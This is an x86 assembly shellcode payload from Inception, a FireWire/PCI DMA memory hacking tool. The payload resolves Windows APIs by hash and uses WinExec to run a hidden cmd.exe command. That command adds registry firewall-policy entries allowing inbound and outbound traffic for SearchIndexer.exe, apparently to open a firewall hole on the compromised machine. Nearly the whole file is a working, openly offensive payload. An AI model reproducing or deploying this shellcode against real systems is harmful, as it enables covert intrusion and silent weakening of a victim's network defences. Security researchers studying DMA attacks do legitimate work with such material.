; Inception - a FireWire physical memory manipulation and hacking tool exploiting
; PCI-based and IEEE 1394 SBP-2 DMA.

; Copyright (C) 2011-2014  Carsten Maartmann-Moe

; This program is free software: you can redistribute it and/or modify
; it under the terms of the GNU General Public License as published by
; the Free Software Foundation, either version 3 of the License, or
; (at your option) any later version.

; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
; GNU General Public License for more details.

; You should have received a copy of the GNU General Public License
; along with this program.  If not, see <http://www.gnu.org/licenses/>.

; Created on Sep 6, 2011

; @author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
[BITS 32]
[ORG 0]

  cld                    ; Clear the direction flag.
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
delta:                   ;
%include "block_api.asm" ; 
start:                   ;
  pop ebp                ; Pop off the address of 'api_call' for calling later.
  push byte 0            ; uCmdShow = 0 - Don't show a CMD window
  lea eax, [ebp+command-delta]
  push eax               ;
  push 0x876F8B31        ; hash( "kernel32.dll", "WinExec" )
  call ebp               ; WinExec( &command, 0 );
  push 0x000007D0        ; = 2000 ms
  push 0xE035F044        ; hash( "kernel32.dll", "Sleep" )
  call ebp               ; Sleep( 2000 );
  jmp continue
command:
  db 'cmd /c "reg add HKLM\SYSTEM\CurrentControlSet\services\SharedAccess\Parameters\FirewallPolicy\RestrictedServices\Configurable\System /v SearchIndexer-1 /t REG_SZ /d "v2.0|Action=Allow|Active=TRUE|Dir=In|App=%systemDrive%\WINDOWS\system32\SearchIndexer.exe|Svc=WSearch|Name=SearchIndexer-1|" & reg add HKLM\SYSTEM\CurrentControlSet\services\SharedAccess\Parameters\FirewallPolicy\RestrictedServices\Configurable\System /v SearchIndexer-2 /t REG_SZ /d "v2.0|Action=Allow|Active=TRUE|Dir=Out|App=%systemDrive%\WINDOWS\system32\SearchIndexer.exe|Svc=WSearch|Name=SearchIndexer-2|""', 0
continue:
  ; Woohoo